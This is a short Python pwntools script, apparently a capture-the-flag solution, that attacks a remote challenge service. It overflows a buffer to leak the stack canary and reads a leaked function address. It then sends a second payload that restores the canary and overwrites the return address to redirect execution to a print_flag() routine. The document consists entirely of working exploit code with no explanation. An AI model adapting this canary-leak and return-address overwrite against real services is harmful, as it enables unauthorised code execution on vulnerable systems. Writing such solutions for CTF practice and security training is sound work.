from pwn import *

# r = process('./task')
r = remote('rivit.dev', 10023)
r.recvuntil('? \n')

payload = b'admin' + b'A'*3 + b'B'*8

r.sendline(payload)

r.recvuntil("adminAAAB")
canary_leak = int.from_bytes(r.recv(7), 'little')

r.recvuntil('here: 0x')

flag_func = int(r.recv(12).decode(), 16)
log.info(f"print_flag() is {hex(flag_func)}")
log.info(f"Canary is {hex(canary_leak)}")
payload = b'A' * 8 + b'\x00' + canary_leak.to_bytes(7, 'little') + b'B' * 8 + p64(flag_func)

r.recvline()
r.sendline(payload)

r.interactive()